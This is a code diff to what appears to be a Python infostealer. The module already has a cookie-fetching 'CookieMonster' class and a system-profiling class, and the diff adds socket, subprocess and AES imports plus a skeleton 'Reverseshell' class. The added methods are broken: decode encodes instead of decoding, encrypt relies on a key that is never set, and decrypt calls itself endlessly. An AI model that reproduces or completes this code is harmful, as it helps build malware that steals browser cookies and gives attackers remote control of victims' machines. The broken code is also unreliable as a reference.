@@ -2,7 +2,10 @@ import re
 import platform
 import requests
 import shutil
-
+import socket
+import base64
+import subprocess
+from Crypto.Cipher import AES
 
 class CookieMonster(object):
     '''Fetches locally stored cookies.'''
@@ -193,3 +196,26 @@ class System(object):
         self.processor += platform.processor()
         self.cpu_count += os.cpu_count()
         return self.platform, self.architecture, self.hostname, self.processor, self.cpu_count
+
+class Reverseshell(object):
+    def __init__(self, host, port):
+        self.socket = socket.socket()
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        if error:
+            print(error)
+
+    def encode(self, data):
+        return base64.b64encode(data)
+
+    def decode(self, data):
+        return base64.b64encode(data)
+
+    def encrypt(self, data, cipher):
+        return self.key.encrypt(data)
+
+    def decrypt(self, data, cipher):
+        return self.decrypt(data)
